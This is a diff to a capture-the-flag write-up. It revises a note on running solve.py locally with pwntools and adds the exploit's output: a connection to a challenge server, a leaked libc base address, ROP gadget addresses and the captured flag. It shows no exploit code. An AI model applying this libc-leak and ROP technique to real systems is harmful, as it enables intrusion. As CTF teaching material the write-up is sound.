@@ -32,4 +32,15 @@ The 1st syscall opens `flag.txt` and returns a fd (which will be 3 since only 0,
 
 ## Caveat about running `solve.py` locally
 
-If there is no `flag.txt` in the `./program` directory, there will be no output from the script because pwntools does not read stderr. 
+If there is no `flag.txt` in the `./program` directory, there will be no output from the script because pwntools' `r.interactive()` does not read stderr. 
+
+## Flag
+
+```
+[+] Opening connection to challs.pwnoh.io on port 13371: Done
+[*] hex(libc.address)='0x7f91399eb000'
+[*] Loaded 219 cached gadgets for './libc.so.6'
+[*] hex(pop_rax_gadget)='0x7f9139a30eb0'
+[*] Switching to interactive mode
+bctf{sh3lls_ar3_bl0at_ju5t_use_sh3llcode!}
+```
